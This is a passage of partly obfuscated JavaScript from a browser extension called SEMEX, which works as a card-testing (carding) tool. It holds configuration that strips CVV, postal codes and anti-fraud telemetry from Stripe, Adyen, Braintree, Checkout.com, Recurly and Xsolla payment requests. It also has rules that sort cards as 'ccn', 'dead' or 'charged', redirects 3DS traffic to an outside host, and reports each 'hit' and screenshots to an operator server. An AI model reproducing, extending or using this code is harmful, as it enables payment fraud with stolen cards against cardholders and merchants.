                    cardNumber: '#cardNumber, input[autocomplete="cc-number"], input[name="cardNumber"]',
                    expiry:     '#expirationDate, input[autocomplete="cc-exp"], input[name="expiry"]',
                    cvv:        '#cvc, input[autocomplete="cc-csc"], input[name="cvc"]'
                },
                delays: {
                    input: 50,
                    submit: 1000
                },
                iframe: true
            }

            return {
                "selectors": {
                    "cardNumber": "input[name=\"cardNumber\"], input[id=\"Field-numberInput\"], input[id=\"cardNumber\"], .CardNumberField, #checkout-frames-card-number",
                    "expiry": "input[name=\"expiry\"], input[id=\"expiry\"], .ExpiryField, #checkout-frames-expiry-date",
                    "cvv": "input[name=\"cvc\"], input[id=\"cvc\"], .CvcField",
                    "zip": "[name=\"postalCode\"], [id=\"postalCode\"], .PostalCodeField",
                    "firstName": "[name=\"firstName\"], [id=\"firstName\"], .FirstNameField",
                    "lastName": "[name=\"lastName\"], [id=\"lastName\"], .LastNameField",
                    "address": "[name=\"addressLine1\"], [id=\"addressLine1\"], .AddressField",
                    "city": "[name=\"city\"], [id=\"city\"], .CityField",
                    "state": "[name=\"state\"], [id=\"state\"], .StateField, select[name=\"state\"]",
                    "phone": "[name=\"phone\"], [id=\"phone\"], .PhoneField",
                    "email": "input[type=\"email\"], input[name=\"email\"], input[autocomplete=\"email\"], input[name=\"aPayment[strEmail]\"]"
                },
                "delays": {
                    "input": 50,
                    "submit": 1000
                }
            };
        } catch (_0x4eeb15) {
            return null;
        }
    }
    async submitStatus(_0x45d1c6) {
        if (this._ready) { try { await this._ready; } catch (e) {} }
        if (!this.fingerprint) {
            try { await this.init(); } catch (e) {}
        }
        // Coerce the payload so the backend's strict field types can NEVER reject it
        // with a 422 (the recurring "server not saved" root cause — a different field
        // each time, e.g. amount "₹250.00", card as a string, response as an object).
        // Only `amount` is numeric and `card` is an object server-side; every other
        // field must be a string. Anything else is stringified or dropped.
        try {
            const _p = _0x45d1c6 || (_0x45d1c6 = {});
            for (const _k in _p) {
                const _v = _p[_k];
                if (_v === null || _v === undefined) { continue; }
                if (_k === "amount") {
                    if (typeof _v === "string") {
                        const _n = parseFloat(_v.replace(/[^0-9.\-]/g, ""));
                        if (isNaN(_n)) { delete _p[_k]; } else { _p[_k] = _n; }
                    } else if (typeof _v !== "number") {
                        delete _p[_k];
                    }
                } else if (_k === "card") {
                    if (typeof _v !== "object") { delete _p[_k]; }
                } else if (typeof _v !== "string") {
                    if (typeof _v === "object") {
                        try { _p[_k] = JSON.stringify(_v); } catch (e) { _p[_k] = String(_v); }
                    } else {
                        _p[_k] = String(_v);
                    }
                }
            }
        } catch (e) {}
        const _doPost = async (_semexBase) => fetch((_semexBase || this.baseUrl) + "/api/data/status", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Fingerprint": this.fingerprint,
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : ""),
                "Authorization": "Bearer " + (await this._getAccessToken())
            },
            body: JSON.stringify(__spreadValues({
                fingerprint: this.fingerprint
            }, _0x45d1c6))
        });
        // Retry on NETWORK failures only (transient drops / proxy hiccups) — up to 3
        // attempts with backoff so a single dropped connection no longer loses the
        // hit + its Telegram notification. HTTP error responses are NOT retried here
        // (401 has its own refresh-retry below).
        const _MAX = 3;
        let _lastErr = "network error";
        for (let _attempt = 1; _attempt <= _MAX; _attempt++) {
            try {
                console.log("[SEMEX] submitStatus →", this.baseUrl + "/api/data/status", "status=" + _0x45d1c6.status, "attempt=" + _attempt);
                let _0x29f45b = await _doPost();
                // Auto-refresh on 401 then retry once with the fresh token.
                if (_0x29f45b.status === 401) {
                    const refreshed = await this._tryRefresh();
                    if (refreshed) {
                        _0x29f45b = await _doPost();
                    }
                }
                const _0x1c2765 = await _0x29f45b.text();
                console.log("[SEMEX] submitStatus ← HTTP " + _0x29f45b.status, _0x1c2765.slice(0, 200));
                let _semexOut;
                try {
                    _semexOut = JSON.parse(_0x1c2765);
                } catch (_0x33fd47) {
                    _semexOut = { error: "Invalid Server Response" };
                }
                // UPGRADE REQUIRED — server rejected because the extension is
                // too old. Persist the update-info + notify the popup so a
                // hard-block modal can be shown, and stop retrying.
                if (_0x29f45b.status === 426) {
                    try {
                        const _det = (_semexOut && _semexOut.detail) || _semexOut || {};
                        const _info = {
                            required: true,
                            sentVersion: _det.sentVersion || "",
                            minVersion: _det.minVersion || "",
                            downloadUrl: _det.downloadUrl || "",
                            botLink: _det.botLink || "",
                            botCommand: _det.botCommand || "/get",
                            message: _det.message || "Please update your SEMEX extension.",
                            detectedAt: Date.now(),
                        };
                        if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
                            await chrome.storage.local.set({ __xugr: _info });
                        }
                        if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
                            try { chrome.runtime.sendMessage({ type: "SEMEX_UPGRADE_REQUIRED", info: _info }); } catch (_e) {}
                        }
                    } catch (_e) {}
                    return { success: false, _http: 426, _error: "upgrade_required", upgradeRequired: true, upgrade: _semexOut && _semexOut.detail };
                }
                if (_semexOut && typeof _semexOut === "object") {
                    _semexOut._http = _0x29f45b.status;
                    const _stringifyErr = (_e) => {
                        if (_e == null) return "";
                        if (typeof _e === "string") return _e;
                        if (Array.isArray(_e)) {
                            return _e.map(_x => (_x && (_x.msg || _x.message)) ? ((_x.loc ? (Array.isArray(_x.loc) ? _x.loc.join(".") : _x.loc) + ": " : "") + (_x.msg || _x.message)) : (typeof _x === "string" ? _x : JSON.stringify(_x))).join("; ");
                        }
                        if (typeof _e === "object") return _e.msg || _e.message || _e.detail || JSON.stringify(_e);
                        return String(_e);
                    };
                    if (_semexOut.error && typeof _semexOut.error !== "string") {
                        _semexOut.error = _stringifyErr(_semexOut.error);
                    }
                    if (!_0x29f45b.ok && !_semexOut.error) {
                        _semexOut._error = _stringifyErr(_semexOut.detail) || ("HTTP " + _0x29f45b.status);
                    }
                }
                return _semexOut;
            } catch (_0x5ed4aa) {
                _lastErr = _0x5ed4aa && _0x5ed4aa.message ? _0x5ed4aa.message : String(_0x5ed4aa);
                console.error("[SEMEX] submitStatus network error (attempt " + _attempt + "/" + _MAX + "):", _lastErr);
                if (_attempt < _MAX) {
                    await new Promise(_r => setTimeout(_r, 800 * _attempt));
                }
            }
        }
        // All retries on primary URL failed — attempt fallback URL once.
        // If fallback succeeds, switch baseUrl so all future calls also use it.
        if (SEMEX_FALLBACK_URL && SEMEX_FALLBACK_URL !== this.baseUrl) {
            try {
                console.log("[SEMEX] submitStatus → fallback", SEMEX_FALLBACK_URL + "/api/data/status");
                let _fbResp = await _doPost(SEMEX_FALLBACK_URL);
                if (_fbResp.status === 401) {
                    const _fbRefreshed = await this._tryRefresh();
                    if (_fbRefreshed) _fbResp = await _doPost(SEMEX_FALLBACK_URL);
                }
                const _fbText = await _fbResp.text();
                let _fbOut;
                try { _fbOut = JSON.parse(_fbText); } catch (_e) { _fbOut = { error: "Invalid Server Response" }; }
                if (_fbOut && typeof _fbOut === "object") {
                    _fbOut._http = _fbResp.status;
                    if (!_fbResp.ok && !_fbOut.error) _fbOut._error = "HTTP " + _fbResp.status;
                }
                // Switch all future API calls to the fallback URL
                if (_fbResp.ok) {
                    console.log("[SEMEX] primary down — switched to fallback URL:", SEMEX_FALLBACK_URL);
                    this.baseUrl = SEMEX_FALLBACK_URL;
                }
                return _fbOut || { success: false, _http: 0, _error: "fallback empty response" };
            } catch (_fbErr) {
                console.error("[SEMEX] submitStatus fallback also failed:", _fbErr && _fbErr.message);
            }
        }
        return { success: false, _http: 0, _error: _lastErr || "network error" };
    }
    async _tryRefresh() {
        try {
            if (typeof chrome === "undefined" || !chrome.storage) return false;
            const s = await chrome.storage.local.get([_SK_RT]);
            if (!s[_SK_RT]) return false;
            const r = await fetch(this.baseUrl + "/api/auth/refresh", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ refreshToken: s[_SK_RT] })
            });
            if (!r.ok) return false;
            const data = await r.json();
            if (data.accessToken) {
                await chrome.storage.local.set({ [_SK_AT]: data.accessToken });
                return true;
            }
        } catch (e) {}
        return false;
    }
    async redeemCode(code) {
        // FIX: redeem MUST be authenticated. The old popup did a raw fetch with no
        // Authorization header, so the backend returned 401 and codes were "not
        // redeemable". This sends the bearer token + fingerprint and retries once
        // after a token refresh on 401.
        try {
            if (this._ready) { try { await this._ready; } catch (e) {} }
            if (!this.fingerprint) { await this.init(); }
            const doFetch = async () => fetch(this.baseUrl + "/api/auth/redeem", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-Fingerprint": this.fingerprint,
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : ""),
                    "Authorization": "Bearer " + (await this._getAccessToken())
                },
                body: JSON.stringify({ fingerprint: this.fingerprint, code })
            });
            let r = await doFetch();
            if (r.status === 401) {
                const refreshed = await this._tryRefresh();
                if (refreshed) r = await doFetch();
            }
            const text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch (e) { return { success: false, message: "Invalid server response" }; }
            if (!r.ok) {
                return { success: false, message: data.detail || data.message || ("Error " + r.status) };
            }
            return data;
        } catch (e) {
            return { success: false, message: "Failed to connect to server" };
        }
    }

    async fetchInstructions(_0x2a8a04, _0x288e63, _0x20a0cc, _0x3f492f = false) {
        if (!this.fingerprint) {
            await this.init();
        }
        try {
            return {
                action: 'REMOVE_PARAMS',
                params: [
                    'payment_user_agent',
                    'payment_method_data[payment_user_agent]',
                    'source_data[payment_user_agent]',
                    'pasted_fields',
                    'payment_method_data[pasted_fields]',
                    'source_data[pasted_fields]',
                    'card[pasted_fields]',
                    'billing_details[pasted_fields]',
                    'time_on_page',
                    'payment_method_data[time_on_page]',
                    'source_data[time_on_page]',
                    'muid',
                    'sid',
                    'guid',
                    'zip',
                    'postal_code',
                    'zip_code',
                    'postal',
                    'address_zip',
                    'card[address_zip]',
                    'card[postal_code]',
                    'card[zip]',
                    'billing_details[address][postal_code]',
                    'billing_details[address][zip]',
                    'billing_details[address][zip_code]',
                    'payment_method_data[billing_details][address][postal_code]',
                    'payment_method_data[billing_details][address][zip]',
                    'owner[address][postal_code]',
                    'owner[address][zip]',
                    'source_data[owner][address][postal_code]',
                    'address[postal_code]',
                    'address[zip]',
                    'address[zip_code]',
                    'billing[postal_code]',
                    'billing_address[postal_code]'
                ],
                regexRemovals: ['"cvc":\\s*"[^"]*",?', '"cvv":\\s*"[^"]*",?'],
                bypassTypes: ['PAU', 'SECURITY'],
                cardReplacementParams: {
                    number: [
                        'card[number]',
                        'payment_method_data[card][number]',
                        'source_data[card][number]',
                        'source[card][number]'
                    ],
                    exp_month: [
                        'card[exp_month]',
                        'payment_method_data[card][exp_month]',
                        'source_data[card][exp_month]',
                        'source[card][exp_month]'
                    ],
                    exp_year: [
                        'card[exp_year]',
                        'payment_method_data[card][exp_year]',
                        'source_data[card][exp_year]',
                        'source[card][exp_year]'
                    ],
                    cvc: [
                        'card[cvc]',
                        'card[cvv]',
                        'payment_method_data[card][cvc]',
                        'source_data[card][cvc]',
                        'source[card][cvc]'
                    ]
                },
                description: 'Stripe Bypass: Remove CVV and PAU parameters'
            };
        } catch (_0x33ebf9) {
            return null;
        }
    }
    async fetchSessionRules() {
        try {
            return {
                "cardReplacementParams": {
                    "adyen": {
                        "cvc": [
                            "encryptedSecurityCode"
                        ],
                        "exp_month": [
                            "encryptedExpiryMonth"
                        ],
                        "exp_year": [
                            "encryptedExpiryYear"
                        ],
                        "number": [
                            "encryptedCardNumber"
                        ]
                    },
                    "checkout": {
                        "cvc": [
                            "cvv"
                        ],
                        "exp_month": [
                            "expiry_month"
                        ],
                        "exp_year": [
                            "expiry_year"
                        ],
                        "number": [
                            "number"
                        ]
                    },
                    "recurly": {
                        "cvc": [
                            "cvv"
                        ],
                        "exp_month": [
                            "month"
                        ],
                        "exp_year": [
                            "year"
                        ],
                        "number": [
                            "number"
                        ]
                    },
                    "stripe": {
                        "cvc": [
                            "card[cvc]",
                            "card[cvv]",
                            "payment_method_data[card][cvc]",
                            "source_data[card][cvc]",
                            "source[card][cvc]"
                        ],
                        "exp_month": [
                            "card[exp_month]",
                            "payment_method_data[card][exp_month]",
                            "source_data[card][exp_month]",
                            "source[card][exp_month]"
                        ],
                        "exp_year": [
                            "card[exp_year]",
                            "payment_method_data[card][exp_year]",
                            "source_data[card][exp_year]",
                            "source[card][exp_year]"
                        ],
                        "number": [
                            "card[number]",
                            "payment_method_data[card][number]",
                            "source_data[card][number]",
                            "source[card][number]"
                        ]
                    },
                    "xsolla": {
                        "cvc": [
                            "xps_encrypted_card"
                        ],
                        "exp_month": [
                            "xps_encrypted_card"
                        ],
                        "exp_year": [
                            "xps_encrypted_card"
                        ],
                        "number": [
                            "xps_encrypted_card"
                        ],
                        "openCard": [
                            "xps_open_card"
                        ]
                    },
                    "braintree": {
                        "creditCardPaths": [
                            "variables.input.creditCard",
                            "variables.input.payment.creditCard",
                            "creditCard"
                        ],
                        "cvv": "cvv",
                        "number": "number",
                        "exp_month": "expirationMonth",
                        "exp_year": "expirationYear"
                    }
                },
                "paymentTracking": {
                    "adyen": {
                        "customFailure": {
                            "type": "failed"
                        },
                        "customSuccess": {
                            "redirectionType": "internal",
                            "type": "redirected"
                        },
                        "domains": [
                            "adyen.com",
                            "checkoutshopper",
                            "checkoutshopper-live.adyen.com",
                            "checkoutshopper-test.adyen.com",
                            "api.gog.com",
                            "cloud.boosteroid.com"
                        ],
                        "errorFields": [
                            "refusalReason",
                            "errorCode"
                        ],
                        "excludePatterns": [
                            "checkoutanalytics"
                        ],
                        "expiredStatuses": [
                            "EXPIRED",
                            "UNFINISHED_PAYMENTS"
                        ],
                        "failureStatuses": [
                            "Refused",
                            "Cancelled",
                            "Error",
                            "REJECTED",
                            "CANCELED",
                            "UNKNOWN_FAILURE",
                            "failed"
                        ],
                        "paymentEndpoints": [
                            "/payments",
                            "/payment",
                            "/payments/adyen",
                            "/payment/adyen",
                            "/v1/checkout",
                            "/api/v2/payments/adyen"
                        ],
                        "statusPaths": [
                            "resultCode",
                            "data.resultCode",
                            "data.data.resultCode",
                            "orderStatus",
                            "aggregatedPaymentStatus",
                            "type"
                        ],
                        "successStatuses": [
                            "Authorised",
                            "received",
                            "RedirectShopper",
                            "COMPLETED_SUCCESSFULLY",
                            "ACCEPTED"
                        ]
                    },
                    "checkout": {
                        "ccnIndicators": {
                            "htmlPatterns": [
                                "3DS2 Challenge",
                                "3DS Challenge"
                            ],
                            "jsonPatterns": [
                                "not_enough_funds"
                            ]
                        },
                        "declineReasonField": "decline_reason",
                        "domains": [
                            "api.checkout.com",
                            "checkout.com",
                            "card-acquisition-gateway.checkout.com"
                        ],
                        "excludePatterns": [],
                        "failureIndicators": {
                            "htmlPatterns": [
                                "RedirectReason: 'failure'",
                                "RedirectReason: 'declined'"
                            ],
                            "jsonPatterns": [
                                "Declined",
                                "payment_attempts_exceeded",
                                "invalid_customer_data",
                                "card_number_invalid"
                            ],
                            "urlPatterns": [
                                "failure?"
                            ]
                        },
                        "htmlParsing": {
                            "redirectReasonEnd": "'",
                            "redirectReasonPattern": "RedirectReason: '",
                            "redirectUrlEnd": "')",
                            "redirectUrlPattern": "window.top.location.replace('"
                        },
                        "paymentEndpoints": [
                            "/tokens",
                            "/payment-sessions/",
                            "/submit",
                            "/3ds/",
                            "/device-information"
                        ],
                        "statusPaths": [
                            "status",
                            "decline_reason",
                            "response_summary"
                        ],
                        "successIndicators": {
                            "htmlPatterns": [
                                "RedirectReason: 'success'"
                            ],
                            "jsonPatterns": [
                                "Approved"
                            ],
                            "urlPatterns": [
                                "confirmation?"
                            ]
                        }
                    },
                    "recurly": {
                        "domains": [
                            "vyprvpn.com"
                        ],
                        "failureIndicators": {
                            "httpCodes": [
                                400,
                                402,
                                422,
                                424
                            ],
                            "titlePatterns": [
                                "not valid",
                                "declined",
                                "insufficient",
                                "refused"
                            ],
                            "typePatterns": [
                                "/problems/",
                                "transaction-error",
                                "invalid"
                            ]
                        },
                        "paymentEndpoints": [
                            "/api/",
                            "/create-subscription",
                            "/recurly/set-billing-info"
                        ],
                        "successIndicators": {
                            "httpCodes": [
                                200,
                                201
                            ],
                            "noErrorField": true
                        }
                    },
                    "stripe": {
                        "ccnCodes": [
                            "insufficient_funds",
                            "incorrect_cvc",
                            "invalid_cvc",
                            "transaction_not_allowed"
                        ],
                        "ccnMessages": [
                            "insufficient funds",
                            "security code is invalid",
                            "security code is incorrect",
                            "incorrect security code",
                            "invalid security code",
                            "does not support this type of purchase",
                            "previously used"
                        ],
                        "deadMessages": [
                            "invalid json",
                            "collect the security code",
                            "integration surface is unsupported",
                            "required to use the stripe sdk"
                        ],
                        "domains": [
                            "api.stripe.com"
                        ],
                        "errorPaths": [
                            "error",
                            "last_payment_error",
                            "last_setup_error",
                            "payment_intent.last_payment_error",
                            "setup_intent.last_payment_error",
                            "error.setup_intent.last_setup_error"
                        ],
                        "excludePatterns": [
                            "r.stripe.com",
                            "analytics",
                            "telemetry",
                            "logging"
                        ],
                        "expiredCardCodes": [
                            "expired_card",
                            "invalid_expiry_month",
                            "invalid_expiry_year"
                        ],
                        "expiredCodes": [
                            "checkout_not_active_session",
                            "checkout_session_expired",
                            "payment_intent_unexpected_state"
                        ],
                        "expiredMessages": [
                            "expired",
                            "not active",
                            "timed out",
                            "timeout",
                            "canceled",
                            "status of canceled"
                        ],
                        "paymentEndpoints": [
                            "/verify_challenge",
                            "/payment_intents/",
                            "/payment_pages/",
                            "/confirm",
                            "/setup_intents/",
                            "/completed_webhook_delivered",
                            "/3ds2/authenticate"
                        ],
                        "skipStatuses": [
                            "requires_action",
                            "requires_source_action",
                            "authentication_required"
                        ],
                        "statusPaths": [
                            "payment_intent.status",
                            "setup_intent.status",
                            "status",
                            "payment_status",
                            "data.payment_intent.status",
                            "data.setup_intent.status",
                            "data.status"
                        ],
                        "subscriptionCodes": [
                            "checkout_has_active_subscriptions"
                        ],
                        "subscriptionMessages": [
                            "already have a subscription",
                            "manage your subscription"
                        ],
                        "successStatuses": [
                            "succeeded",
                            "requires_capture"
                        ]
                    },
                    "woocommerce": {
                        "endpointPatterns": [
                            "wc-ajax=checkout"
                        ],
                        "failureIndicators": {
                            "ccnPatterns": [
                                "security code",
                                "cvc",
                                "cvv",
                                "incorrect",
                                "insufficient funds",
                                "security code is invalid",
                                "security code is incorrect",
                                "incorrect security code",
                                "invalid security code",
                                "does not support this type of purchase",
                                "previously used"
                            ],
                            "deadPatterns": [
                                "declined",
                                "invalid card",
                                "card number",
                                "do not honor"
                            ],
                            "failureValue": "failure",
                            "messageField": "messages",
                            "resultField": "result"
                        },
                        "successIndicators": {
                            "chargedPattern": "order-received",
                            "redirectField": "redirect",
                            "resultField": "result",
                            "successValue": "success"
                        }
                    },
                    "braintree": {
                        "domains": [
                            "braintree-api.com",
                            "braintreegateway.com",
                            "client.bin.paypal.com"
                        ],
                        "urlPatterns": [
                            "braintree-api.com",
                            "braintreegateway.com",
                            "client.bin.paypal.com",
                            "/braintree"
                        ],
                        "graphql": {
                            "successFields": ["chargePaymentMethod", "createTransaction"],
                            "tokenizeFields": ["tokenizeCreditCard"],
                            "successStatuses": ["AUTHORIZED", "SETTLED", "SUBMITTED_FOR_SETTLEMENT"]
                        },
                        "ccnIndicators": {
                            "messagePatterns": [
                                "insufficient funds",
                                "insufficient fund",
                                "not enough funds"
                            ]
                        },
                        "restSuccessField": "success",
                        "transactionSuccessStatuses": [
                            "authorized",
                            "settled",
                            "submitted_for_settlement"
                        ],
                        "transactionFailureStatuses": [
                            "processor_declined",
                            "gateway_rejected",
                            "failed"
                        ]
                    },
                    "whop": {
                        "urlPatterns": [
                            "whop.com/api/v1/checkout_sessions/"
                        ],
                        "statusPaths": [
                            "status"
                        ],
                        "successStatuses": [
                            "completed"
                        ],
                        "failureStatuses": [
                            "failed",
                            "expired",
                            "canceled",
                            "cancelled"
                        ],
                        "skipStatuses": [
                            "open",
                            "pending",
                            "processing"
                        ],
                        "ccnIndicators": {
                            "messagePatterns": [
                                "insufficient funds",
                                "insufficient fund",
                                "not enough funds"
                            ]
                        }
                    }
                },
                "skipPatterns": {
                    "adyen": [
                        "/analytics",
                        "/sessions/setup",
                        "/checkoutanalytics"
                    ],
                    "checkout": [
                        "/frames/callback",
                        "/cdn/frames"
                    ],
                    "stripe": [
                        "consumers/sessions/lookup",
                        "consumers/accounts",
                        "payment_pages/ephemeral_keys",
                        "setup_intents/validate",
                        "address_element",
                        "customer_session",
                        "experiments/lookup"
                    ]
                },
                "timestamp": 1774331386594,
                "version": "1.3.0",
                "xhrBypass": {
                    "adyen": {
                        "action": "REMOVE_FROM_JSON",
                        "enabled": true,
                        "targets": [
                            "encryptedSecurityCode"
                        ]
                    },
                    "checkout": {
                        "action": "REMOVE_FROM_JSON",
                        "enabled": true,
                        "targets": [
                            "cvv"
                        ]
                    },
                    "recurly": {
                        "action": "BLANK_IN_URLENCODED",
                        "enabled": true,
                        "targets": [
                            "cvv"
                        ]
                    },
                    "stripe": {
                        "action": "REMOVE_FROM_URLENCODED",
                        "enabled": true,
                        "pauTargets": [
                            "payment_user_agent",
                            "payment_method_data[payment_user_agent]",
                            "source_data[payment_user_agent]"
                        ],
                        "securityEnabled": true,
                        "securityTargets": {
                            "pasted": [
                                "pasted_fields",
                                "payment_method_data[pasted_fields]",
                                "source_data[pasted_fields]",
                                "card[pasted_fields]",
                                "billing_details[pasted_fields]"
                            ],
                            "timing": [
                                "time_on_page",
                                "payment_method_data[time_on_page]",
                                "source_data[time_on_page]"
                            ],
                            "tracking": [
                                "muid",
                                "sid",
                                "guid"
                            ]
                        },
                        "targets": [
                            "cvc",
                            "cvv",
                            "security_code",
                            "cvv2",
                            "cvc2",
                            "card[cvc]",
                            "card[cvv]",
                            "payment_method_data[card][cvc]",
                            "payment_method_options[card][cvc]",
                            "link[card][cvc]",
                            "source_data[card][cvc]",
                            "source[card][cvc]",
                            "billing_details[card][cvc]",
                            "payment_method[card][cvc]",
                            "setup_intent_data[card][cvc]",
                            "token[card][cvc]"
                        ],
                        "zipTargets": [
                            "zip",
                            "postal_code",
                            "zip_code",
                            "postal",
                            "address_zip",
                            "card[address_zip]",
                            "card[postal_code]",
                            "card[zip]",
                            "billing_details[address][postal_code]",
                            "billing_details[address][zip]",
                            "billing_details[address][zip_code]",
                            "payment_method_data[billing_details][address][postal_code]",
                            "payment_method_data[billing_details][address][zip]",
                            "owner[address][postal_code]",
                            "owner[address][zip]",
                            "source_data[owner][address][postal_code]",
                            "address[postal_code]",
                            "address[zip]",
                            "address[zip_code]",
                            "billing[postal_code]",
                            "billing_address[postal_code]"
                        ]
                    },
                    "stripe3ds": {
                        "action": "REPLACE_URL_ONLY",
                        "enabled": true,
                        "targetHost": "railway-production-af32.up.railway.app"
                    },
                    "xsolla": {
                        "action": "XSOLLA_ENCRYPT_REPLACE",
                        "domains": [
                            "secure.xsolla.com",
                            "xsolla.com"
                        ],
                        "enabled": false,
                        "encryptionParams": {
                            "cvvBypass": true,
                            "encryptedCardField": "xps_encrypted_card",
                            "openCardField": "xps_open_card",
                            "publicKeyField": "xps_public_key",
                            "threeDSBypassBin": "414720"
                        },
                        "paymentEndpoints": [
                            "/directpayment",
                            "/paystation",
                            "/api"
                        ]
                    },
                    "braintree": {
                        "action": "BRAINTREE_GRAPHQL_REMOVE",
                        "enabled": true,
                        "cvvField": "cvv",
                        "creditCardPaths": [
                            "variables.input.creditCard",
                            "variables.input.payment.creditCard",
                            "creditCard"
                        ],
                        "urlEncodedTargets": [
                            "credit_card%5Bcvv%5D",
                            "credit_card[cvv]"
                        ],
                        "domains": [
                            "braintree-api.com",
                            "braintreegateway.com",
                            "client.bin.paypal.com"
                        ]
                    }
                }
            };
        } catch (_0x3e7533) {
            return null;
        }
    }
    async uploadScreenshot(_0x1ebd61) {
        try {
            if (!this.fingerprint) {
                await this.init();
            }
            // Route through authedFetch so an expired access token refreshes and
            // retries once instead of permanently failing after the 15-min TTL.
            const _0x472c9 = await this.authedFetch("/api/data/screenshot", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(__spreadValues({
                    fingerprint: this.fingerprint
                }, _0x1ebd61))
            });
            const _0x1c79f5 = await this._handleResponse(_0x472c9);
            return _0x1c79f5 || {
                success: false,
                error: "Unknown Error"
            };
        } catch (_0xaeb309) {
            return {
                success: false,
                error: _0xaeb309.message
            };
        }
    }
    /**
     * Authenticated fetch with automatic token-refresh-on-401 + one retry.
     * Any authenticated API call SHOULD go through this so a 15-min access-token
     * expiry never hard-fails a feature. (The Saved BINs panel previously fetched
     * raw with no refresh, so it alone 401'd with "invalid token" once the token
     * aged out.) NOTE: some legacy paths (user settings/state/stream, IP-check,
     * admin calls) still fetch raw and share that same latent expiry bug — they
     * should be migrated to this helper too. `path` may be a "/api/..." path or a
     * full URL. Returns the raw Response so callers read .ok / .status / .json().
     * A 401 that survives the refresh means the user is truly logged out.
     */
    async authedFetch(path, options = {}) {
        if (this._ready) { try { await this._ready; } catch (e) {} }
        if (!this.fingerprint) { try { await this.init(); } catch (e) {} }
        const url = /^https?:\/\//i.test(path) ? path : (this.baseUrl + path);
        const _ver = (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : "");
        const _doFetch = async () => {
            const headers = {};
            // Merge caller headers FIRST — support both plain objects and Headers
            // instances (a Headers instance has no own-enumerable props, so
            // Object.assign alone drops it).
            const _ch = options && options.headers;
            if (_ch) {
                if (typeof Headers !== "undefined" && _ch instanceof Headers) {
                    _ch.forEach((v, k) => { headers[k] = v; });
                } else {
                    Object.assign(headers, _ch);
                }
            }
            // Auth headers always win over caller-supplied ones: on a 401 the
            // retry must carry the FRESH token, not the caller's stale copy.
            headers["Authorization"] = "Bearer " + (await this._getAccessToken());
            headers["X-Fingerprint"] = this.fingerprint || "";
            headers["X-Extension-Version"] = _ver;
            // Default to JSON only when there's a body and the caller didn't set a type.
            if (options && options.body && !("Content-Type" in headers) && !("content-type" in headers)) {
                headers["Content-Type"] = "application/json";
            }
            return fetch(url, Object.assign({}, options, { headers }));
        };
        let r = await _doFetch();
        if (r && r.status === 401) {
            const refreshed = await this._tryRefresh();
            if (refreshed) { r = await _doFetch(); }  // retry once with the fresh token
        }
        return r;
    }
    async _getAccessToken() {
        try {
            if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
                const r = await chrome.storage.local.get([_SK_AT, _SK_RT]);
                if (r[_SK_AT]) return r[_SK_AT];
            }
        } catch (e) {}
        return "";
    }
};
__name(_ServerClient, "ServerClient");
let ServerClient = _ServerClient;
(typeof window !== "undefined" ? window : self).serverClient = new ServerClient();